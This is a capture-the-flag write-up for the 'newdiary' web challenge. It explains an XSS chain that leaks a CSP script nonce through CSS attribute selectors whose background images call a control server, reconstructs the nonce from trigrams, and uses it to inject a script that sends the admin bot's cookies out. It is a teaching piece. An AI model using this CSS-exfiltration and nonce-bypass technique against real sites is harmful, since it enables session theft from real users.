# newdiary&emsp;<sub><sup>Web, 458 points</sup></sub>

_Writeup by [@bluepichu](https://github.com/bluepichu)_

The problem provides a pretty standard XSS setup: the ability to create posts and report them to an XSS bot, with the goal being to retrieve the bot's cookies.

The "view reported post" page gives the ability to inject arbitrary HTML in the page, with the only mitigation being a CSP with a nonce rule, which is properly randomized.  However, the CSP does not prevent us from connecting to an external server and does not prevent styles, so we can use styled elements with a background image pointing to a control server to exfiltrate information.  Conveniently, there is a copy of the script nonce in a script tag on the page, meaning that we can make checks against that element to leak information about the nonce.  In particular, we can write CSS rules like this to check for various patterns within the nonce:

```css
body:has([nonce^=a]) {
	background-image: url('http://controlserver/a');
}
```

The "view reported post" page also responds to the `hashchange` event exactly one time, allowing us to switch the content rendered on the page to a different post.  This means that if we can leak the nonce using one post's content, then we can create a new post with the known nonce and then swap out the page content by changing the hash to the new post's ID.

The approach we arrived at to actually leak the nonce was to use trigrams; so in particular, we check for the existence of every 3-character pattern within the base-36 nonce.  Since the CSP allows hosting styles on unpkg, we just hosted [an NPM package](https://www.npmjs.com/package/notrightpad) with the appropriate stylesheet and included it from there.  This is enough information to recover the entire nonce so long as no bigrams are repeated, which is likely to occur for a random nonce.

The full exploit chain is:
- Use a meta redirect to get the admin to our own site
- Open the "view reported post" page in an iframe on our site, viewing a post that loads our custom nonce-leaking CSS
- Receive all of the trigrams
- Reconstruct the nonce from the trigrams
- Create a new post containing a script in a srcdoc-based iframe that sends us the cookies, which contains the nonce we recovered
- Change the hash on the iframe to make the admin load this new post
